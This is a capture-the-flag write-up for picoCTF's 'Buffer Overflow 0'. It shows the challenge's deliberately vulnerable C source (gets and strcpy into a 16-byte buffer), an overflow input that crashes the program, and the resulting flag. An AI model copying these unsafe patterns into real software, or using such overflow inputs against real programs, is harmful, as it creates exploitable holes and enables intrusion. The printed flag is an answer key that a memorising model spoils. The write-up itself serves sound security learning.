## Buffer Overflow 0

1. An instance of the challenge is initiated:
```
nc saturn.picoctf.net 51857
```
2. Output:
```
Input: hello
The program will exit now
```
3. The source file is examined:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
4. On going through the file, the flag is printed with the ```void sigsegv_handler``` which takes a signal input.

5. In the ```main``` function, a signal handler is created. An input is taken initially in variable ```buf1[100]```. It is passed on to the ```vuln()``` function which declares a ```buf2[16]``` variable and copies the contents of buf1 to buf2. 

6. Going by the challenge name, it was intuitive to think about somehow overflowing the buffer, by inputting a suitable value that would trigger the signal for the flag to print out.

7. The following prints the flag:
```
Input: jjhjhjhjhjhjhjhjhjhhjhjhjhjhhjjhj
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

